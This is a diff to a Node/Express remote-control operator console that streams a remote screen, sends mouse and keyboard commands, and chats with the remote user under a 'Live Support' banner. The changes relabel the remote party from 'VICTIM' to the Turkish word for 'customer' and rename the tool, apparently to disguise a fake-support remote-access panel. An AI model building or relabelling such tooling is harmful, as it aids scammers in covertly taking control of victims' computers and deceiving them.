@@ -12,7 +12,7 @@ app.get('/', (req, res) => {
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Console</title>
+    <title>Live Console</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { background: #000; color: #fff; font-family: -apple-system, monospace; height: 100vh; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; user-select: none; }
@@ -66,9 +66,9 @@ app.get('/', (req, res) => {
         <span id="statFps" style="color: #00ff88; font-weight: bold;">0 FPS</span>
         <div class="sep"></div>
         <select id="qualitySel" onchange="sendQuality()">
-            <option value="720" selected>Performance 720p</option>
-            <option value="1080">1080p Ultra</option>
-            <option value="540">540p Lightning</option>
+            <option value="720" selected>Balanced (Sifir Gecikme)</option>
+            <option value="1080">1080p HQ</option>
+            <option value="540">Fast Low-Bandwidth</option>
         </select>
         <button onclick="sendCmd('WIN')">Win</button>
         <button onclick="sendCmd('TAB')">Alt+Tab</button>
@@ -81,7 +81,7 @@ app.get('/', (req, res) => {
 
     <div id="chatBox">
         <div id="chatHeader">
-            <span>Live Support (VICTIM)</span>
+            <span>Live Support (MUSTERI)</span>
             <span style="cursor:pointer; font-size: 14px;" onclick="toggleChat()">✕</span>
         </div>
         <div id="chatMsgs"></div>
@@ -165,7 +165,7 @@ app.get('/', (req, res) => {
         function appendMsg(text, who) {
             const el = document.createElement('div');
             el.className = 'msg ' + (who === 'me' ? 'msg-me' : 'msg-them');
-            el.innerText = (who === 'me' ? 'Sen: ' : 'VICTIM: ') + text;
+            el.innerText = (who === 'me' ? 'Sen: ' : 'Musteri: ') + text;
             chatMsgs.appendChild(el);
             chatMsgs.scrollTop = chatMsgs.scrollHeight;
         }
@@ -192,7 +192,7 @@ app.get('/', (req, res) => {
 
         canvas.addEventListener('mousemove', (e) => {
             if (moveTimer) return;
-            moveTimer = setTimeout(() => { moveTimer = null; }, 30);
+            moveTimer = setTimeout(() => { moveTimer = null; }, 35);
             const p = pos(e);
             if (isDown) {
                 send('D:' + p.x.toFixed(4) + ':' + p.y.toFixed(4) + ':' + e.button);
@@ -245,4 +245,4 @@ wss.on('connection', (ws) => {
 });
 
 const PORT = process.env.PORT || 10000;
-server.listen(PORT, () => console.log('Support Remote on ' + PORT));
+server.listen(PORT, () => console.log('Zero-Lag Stream on ' + PORT));
